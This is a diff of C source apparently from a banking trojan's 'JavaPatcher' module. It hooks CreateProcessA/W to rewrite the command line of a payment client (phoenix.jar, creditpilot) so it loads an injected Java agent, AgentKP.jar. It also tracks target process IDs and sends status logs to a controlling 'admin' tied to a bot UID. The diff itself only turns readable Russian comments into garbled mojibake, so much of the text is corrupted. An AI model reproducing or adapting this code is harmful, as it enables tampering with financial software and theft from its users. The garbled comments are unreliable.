+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 void JavaPatcherAddPidToFile()
 {
 	char wjDat[MAX_PATH];
@@ -1064,10 +1075,10 @@ void JavaPatcherAddPidToFile()
 			for( int i = 0; i < count; i++ )
 				if( pids[i] == PID )
 				{
-					PID = 0; //такой пид уже есть, добавлятьв файл не нужно
+					PID = 0; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 					break;
 				}
-			if( PID ) //добавляем пид
+			if( PID ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 			{
 				DWORD* pids2 = (DWORD*)MemAlloc(size + 4);
 				pids2[0] = PID;
@@ -1083,14 +1094,14 @@ void JavaPatcherAddPidToFile()
 	}
 }
 
-// Функция сигнализирует о необходимости запуска патчей
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD WINAPI JavaPatcherSignal(LPVOID lpData)
 {
 	InitData();
 	GetJavaVersion();
-	if( JavaPatchInstalled() ) //если патч установлен, то не нужно его повторно ставить
+	if( JavaPatchInstalled() ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
-		SendLogToAdmin(101); //сообщаем при появлении окна ввода логина, что патч установлен
+		SendLogToAdmin(101); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		return 0; 
 	}
 
@@ -1107,7 +1118,7 @@ DWORD WINAPI JavaPatcherSignal(LPVOID lpData)
 }
 
 //////////////////////////////////////////////////////////////////////////
-//работа с патчером через хуки
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //////////////////////////////////////////////////////////////////////////
 
 static BOOL (WINAPI *RealCreateProcA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
@@ -1121,11 +1132,11 @@ static bool InsertAfter( char* s, const char* after, const char* ins )
 		int c_after = m_lstrlen(after);
 		int c_ins = m_lstrlen(ins);
 		int c_s = m_lstrlen(s);
-		char* p1 = s + c_s - 1; //последний символ строки
-		char* p2 = p1 + c_ins; //новая позиция последнего символа строки
-		p += c_after; //куда вставлять
-		while( p1 >= p ) *p2-- = *p1--; //раздвигаем
-		while( c_ins-- > 0 ) *p++ = *ins++; //вставляем в освободившееся место
+		char* p1 = s + c_s - 1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		char* p2 = p1 + c_ins; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		p += c_after; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		while( p1 >= p ) *p2-- = *p1--; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		while( c_ins-- > 0 ) *p++ = *ins++; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		return true;
 	}
 	else
@@ -1149,8 +1160,8 @@ static bool ReplaceInstead( char* s, const char* src, const char* dst )
 		}
 		else
 		{
-			char* p1 = s + c_s - 1; //последний символ строки
-			char* p2 = p1 + c_dst - c_src; //новая позиция последнего символа строки
+			char* p1 = s + c_s - 1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+			char* p2 = p1 + c_dst - c_src; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			char* end = p + c_src;
 			while( p1 >= end ) *p2-- = *p1--;
 		}
@@ -1176,7 +1187,7 @@ static char* UpdateJavaCmdLine( const char* cmd )
 	if( GetWorkFolder( path, 0 ) == 0 ) return 0;
 	int lenPath = m_lstrlen(path);
 	char* ret = STR::Alloc(1024);
-	bool res = false; //результат замены
+	bool res = false; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	m_lstrcpy( ret, cmd );
 	fwsprintfA pwsprintfA = Get_wsprintfA();
 	if( javaExe == 1 ) //java.exe
@@ -1248,7 +1259,7 @@ static char* UpdateJavaCmdLine( const char* cmd )
 			replaceSrc = "-jar phoenix.jar";
 			pwsprintfA( replaceDst.str(), "-Xmx256m -javaagent:\"%s\\AgentKP.jar\" -cp \"%s\\AgentKP.jar\";\"%s\\lib\\javassist.jar\";"
 				"phoenix.jar com.creditpilot.phoenix.util.Main", path, path, path );
-			//замена не всегда может сработать, поэтому если вставка after1 сработала, то все ок
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ after1 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ
 			res |= ReplaceInstead( ret, replaceSrc, replaceDst );
 		}
 */
@@ -1303,7 +1314,7 @@ static BOOL WINAPI HookCreateProcessW( PWCHAR lpApplicationName, PWCHAR lpComman
 
 bool SetJavaPatcherHook()
 {
-	DBG( "JavaPatcher", "Установка хуков" );
+	DBG( "JavaPatcher", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ" );
 	char fileName[MAX_PATH];
 	GetWorkFolder( fileName, "PatchFail.txt" );
 	DWORD szFile;
@@ -1321,13 +1332,13 @@ bool SetJavaPatcherHook()
 		if (!HookApi( DLL_KERNEL32, 0x46318AC7, &HookCreateProcessA, &RealCreateProcA ) ) return false;
 		if (!HookApi( DLL_KERNEL32, 0x46318AD1, &HookCreateProcessW, &RealCreateProcW ) ) return false;
 		UID_To_File(BOT_UID);
-//		DBG( "JavaPatcher", "Хуки установлены" );
+//		DBG( "JavaPatcher", "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		ret = true;
 	}
 	else
 	{
-		if( resPatcher == 1 ) ret = true; //патч был не полностью скачен, значит ставить хуки бесполезно, поэтому говорим об успешности
-//		DBG( "JavaPatcher", "Хуки не нужно ставить" );
+		if( resPatcher == 1 ) ret = true; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//		DBG( "JavaPatcher", "пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	}
 	return ret;
 }
